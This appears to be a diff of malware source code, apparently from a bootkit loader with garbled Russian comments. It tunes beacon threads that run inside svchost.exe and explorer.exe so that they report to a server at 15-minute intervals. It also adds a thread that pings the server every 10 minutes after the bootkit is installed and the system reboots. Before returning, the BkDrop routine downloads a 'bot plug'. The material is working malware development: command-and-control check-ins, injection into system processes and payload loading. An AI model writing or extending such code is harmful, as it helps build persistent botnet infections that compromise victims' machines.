@@ -87,8 +87,8 @@ void DbgRptSvchostThread(void* Arguments)
 
 		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
 
-		LDRDBG("DbgRptSvchostThread", "Sleeping 3 min after report...");
-		pSleep(3 * 60 * 1000);
+		LDRDBG("DbgRptSvchostThread", "Sleeping 15 min after report...");
+		pSleep(15 * 60 * 1000);
 	}
 }
 
@@ -110,10 +110,25 @@ void DbgRptExplorerThread(void* Arguments)
 		// 305_ld посто€нна€ работа в Explorer (каждые 3 минуты)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("305_ld"));
 
-		LDRDBG("DbgRptExplorerThread", "Sleeping 3 min after report...");
-		pSleep(3 * 60 * 1000);
+		LDRDBG("DbgRptExplorerThread", "Sleeping 15 min after report...");
+		pSleep(15 * 60 * 1000);
 	}
 }
+
+void DbgRptRebootNotifyThread(void* Arguments)
+{
+	while (true)
+	{
+		LDRDBG("DbgRptRebootNotifyThread", "Pinging server...");
+
+		//150_d таймер отсчета завершени€ ребута
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("150_d"));
+
+		LDRDBG("DbgRptRebootNotifyThread", "Sleeping 10 min");
+		pSleep(10 * 60 * 1000);
+	}
+}
+
 
 
 //----------------------------------------------------------------------------
@@ -609,13 +624,13 @@ void StartBootkitDll(void* Arguments)
 	if (Hash == 0x2608DF01 /* svchost.exe */)
 	{
 		LDRDBG("StartBootkitDll", "LoaderDll loaded in SVCHOST. ");
-		StartThread(DbgRptSvchostThread, NULL);
+		PP_DBGRPT_FUNCTION_CALL(StartThread(DbgRptSvchostThread, NULL));
 	}
 	
 	if (Hash == 0x490A0972 /* explorer.exe */)
 	{
 		LDRDBG("StartBootkitDll", "LoaderDll loaded in EXPLORER. ");
-		StartThread(DbgRptExplorerThread, NULL);
+		PP_DBGRPT_FUNCTION_CALL(StartThread(DbgRptExplorerThread, NULL));
 		
 		LDRDBG("StartBootkitDll", "Starting loading and run plug.");
 		StartThread(ExplorerLoadAndRunBotPlug, NULL);
@@ -748,6 +763,9 @@ BOOL WINAPI BkDrop()
 	LDRDBG("BkDrop", "DeployAndInstallBkDll return %d", InstallResult);
 
 	if (InstallResult == false) return FALSE;
+
+	LDRDBG("BkDrop", "Bk installed successfuly. Starting reboot ping thread...");
+	PP_DBGRPT_FUNCTION_CALL(StartThread(DbgRptRebootNotifyThread, NULL));
 
 	// «акачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
 	return LoadPlugToCache(FALSE, 0);
